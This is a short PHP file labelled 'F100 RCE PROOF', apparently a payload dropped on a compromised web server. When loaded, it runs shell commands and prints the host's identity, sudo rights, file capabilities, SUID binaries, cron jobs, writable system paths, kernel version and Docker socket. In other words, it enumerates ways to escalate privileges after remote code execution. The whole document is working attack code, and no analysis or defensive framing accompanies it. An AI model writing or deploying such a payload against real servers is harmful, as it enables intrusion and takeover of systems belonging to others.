<?php
header('Content-Type: text/plain; charset=utf-8');
echo "=== F100 RCE PROOF ===\n";
echo "hostname: " . php_uname('n') . "\n";
echo "whoami: " . trim(shell_exec('whoami 2>&1')) . "\n";
echo "id: " . trim(shell_exec('id 2>&1')) . "\n";
echo "\n=== SUDO ===\n";
echo trim(shell_exec('sudo -n -l 2>&1')) . "\n";
echo "\n=== CAPABILITIES ===\n";
echo trim(shell_exec('getcap -r / 2>/dev/null | head -20')) . "\n";
echo "\n=== SUID ===\n";
echo trim(shell_exec('find / -perm -4000 -type f 2>/dev/null | head -30')) . "\n";
echo "\n=== CRONTAB ===\n";
echo trim(shell_exec('crontab -l 2>&1')) . "\n";
echo trim(shell_exec('ls -la /etc/cron.d/ 2>&1')) . "\n";
echo "\n=== Writable system paths ===\n";
echo trim(shell_exec('ls -ld /etc/cron.d /var/spool/cron /usr/local/bin 2>&1')) . "\n";
echo "\n=== Kernel ===\n";
echo trim(shell_exec('uname -a 2>&1')) . "\n";
echo "\n=== docker.sock ===\n";
echo trim(shell_exec('ls -la /var/run/docker.sock 2>&1')) . "\n";
echo "\n=== END ===\n";
?>
